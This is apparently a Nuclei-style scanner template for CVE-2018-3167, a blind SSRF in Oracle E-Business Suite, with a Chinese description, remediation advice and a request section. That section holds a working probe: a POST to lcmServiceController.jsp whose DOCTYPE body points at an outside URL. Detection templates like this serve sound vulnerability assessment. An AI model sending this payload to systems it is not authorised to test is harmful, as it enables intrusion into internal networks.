id: CVE-2018-3167
info:
  name: Unauthenticated Blind SSRF in Oracle EBS
  author:
  - l0ne1y
  description: |-
    Oracle E-Business Suite lcmServiceController.jsp 服务器端请求伪造（SSRF）漏洞

    Oracle E-Business Suite（电子商务套件）是美国甲骨文（Oracle）公司的一套全面集成式的全球业务管理软件。Application Management Pack(AMP)for Oracle E-Business Suite是其中的一个扩展了Oracle Enterprise Manager 10g Grid Control以帮助监测和有效地管理电子商务套件的应用软件管理组件。

    Oracle E-Business Suite中的Application Management Pack for Oracle E-Business Suite组件的User Monitoring子组件存在服务器端请求伪造漏洞。远程攻击者可利用该漏洞访问有关内部网络资源的信息。以下版本受到影响：Oracle E-Business Suite 12.1.3版本，12.2.3版本，12.2.4版本，12.2.5版本，12.2.6版本，12.2.7版本。
  severity: medium
  remediation: |2-

    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html

    临时修复方案：
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: body
    words:
    - Unexpected text in DTD
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/OA_HTML/lcmServiceController.jsp'
  method: POST
  body: <!DOCTYPE root PUBLIC "-//B/A/EN" "http://example.com">
